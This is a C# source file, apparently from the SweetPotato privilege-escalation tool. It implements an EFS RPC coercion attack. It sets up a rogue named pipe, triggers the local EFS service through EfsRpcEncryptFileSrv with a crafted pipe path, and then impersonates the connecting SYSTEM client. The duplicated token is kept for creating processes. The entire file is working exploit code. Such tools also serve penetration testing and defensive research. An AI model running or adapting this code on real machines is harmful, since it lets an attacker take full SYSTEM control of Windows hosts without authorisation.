using NtApiDotNet.Ndr.Marshal;
using NtApiDotNet.Win32;
using rpc_df1941c5_fe89_4e79_bf10_463657acf44d_1_0;
using System;
using System.Collections.Generic;
using System.IO.Pipes;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace SweetPotato {
    internal class EfsRpc {

        string pipeName = Guid.NewGuid().ToString();

        NamedPipeServerStream efsrpcPipe;
        Thread efsrpcPipeThread;
        IntPtr systemImpersonationToken = IntPtr.Zero;

        public IntPtr Token { get {return systemImpersonationToken; } }

        void EfsRpcPipeThread() {

            byte[] data = new byte[4];

            efsrpcPipe = new NamedPipeServerStream($"{pipeName}\\pipe\\srvsvc", PipeDirection.InOut, 10, PipeTransmissionMode.Byte, PipeOptions.None, 2048, 2048);
            efsrpcPipe.WaitForConnection();

            Console.WriteLine("[+] Server connected to our evil RPC pipe");

            efsrpcPipe.Read(data, 0, 4);

            efsrpcPipe.RunAsClient(() => {
                if (!ImpersonationToken.OpenThreadToken(ImpersonationToken.GetCurrentThread(),
                    ImpersonationToken.TOKEN_ALL_ACCESS, false, out var tokenHandle)) {
                    Console.WriteLine("[-] Failed to open thread token");
                    return;
                }

                if (!ImpersonationToken.DuplicateTokenEx(tokenHandle, ImpersonationToken.TOKEN_ALL_ACCESS, IntPtr.Zero,
                    ImpersonationToken.SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
                    ImpersonationToken.TOKEN_TYPE.TokenPrimary, out systemImpersonationToken)) {
                    Console.WriteLine("[-] Failed to duplicate impersonation token");
                    return;
                }
                
                Console.WriteLine("[+] Duplicated impersonation token ready for process creation");
            });

            efsrpcPipe.Close();
        }

        public EfsRpc() {
            efsrpcPipeThread = new Thread(EfsRpcPipeThread);
            efsrpcPipeThread.Start();
        }

        public void TriggerEfsRpc() {

            string targetPipe = string.Format($"\\\\localhost/pipe/{pipeName}/\\{pipeName}\\{pipeName}");

            Client c = new Client();

            try
            {
                c.Connect();
            }
            catch (Exception)
            {
                Console.WriteLine($"[-] Failed to connect to RPC endpoint using ALPC transport, trying named pipes instead...");
            }

            if (c.Connected == false)
            {
                try
                {
                    NtApiDotNet.Win32.Rpc.Transport.RpcTransportSecurity trsec = new NtApiDotNet.Win32.Rpc.Transport.RpcTransportSecurity();
                    trsec.AuthenticationLevel = NtApiDotNet.Win32.Rpc.Transport.RpcAuthenticationLevel.PacketPrivacy;
                    trsec.AuthenticationType = NtApiDotNet.Win32.Rpc.Transport.RpcAuthenticationType.Negotiate;

                    c.Connect("ncacn_np", "\\pipe\\efsrpc", "localhost", trsec);
                }
                catch (Exception)
                {
                    Console.WriteLine($"[-] Failed to connect to RPC endpoint using named pipes transport.");
                }
            }

            if (c.Connected)
            {
                Console.WriteLine($"[+] Triggering name pipe access on evil PIPE {targetPipe}");

                c.EfsRpcEncryptFileSrv(targetPipe);
                // More useful functions here https://twitter.com/tifkin_/status/1421225980161626112
            }
        }
    }
}
